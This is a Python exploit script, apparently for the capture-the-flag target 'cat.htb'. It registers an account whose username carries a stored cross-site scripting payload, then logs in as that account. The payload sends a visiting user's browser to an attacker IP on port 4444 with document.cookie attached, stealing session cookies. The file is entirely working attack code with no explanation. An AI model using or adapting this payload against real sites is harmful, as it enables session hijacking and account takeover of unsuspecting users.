import requests
import logging
import urllib3
import sys

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "http://cat.htb/",
    "Cookie": "PHPSESSID=qi6an5o8lofpjtvbupjopvv30u",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
}

BASE_URL = "http://cat.htb"
XSS_PAYLOAD = "<script>document.location='http://<ip>:4444/?c='+document.cookie;</script>"

def create_user(password, email):
    log.info("Registering user with XSS payload")

    url = f"{BASE_URL}/join.php?username={XSS_PAYLOAD}&email={email}&password={password}&registerForm=Register"

    response = requests.get(url, headers=HEADERS, verify=False)

    if response.status_code == 200:
        log.info("Registration successful!")
    else:
        log.error(f"Registration error: {response.status_code}")

    return response

def loginka(username, password):
    log.info("Logging in")
    url = f"{BASE_URL}/join.php?loginUsername={username}&loginPassword={password}&loginForm=Login"

    response = requests.get(url, headers=HEADERS, verify=False)

    if response.status_code == 200:
        log.info("Login successful!")
    else:
        log.error(f"Login error: {response.status_code}")

    return response

if __name__ == "__main__":
    username = "pwned"
    password = "pwned123"
    email = "pwned@pwned.com"

    create_user(password, email)
    loginka(username, password)
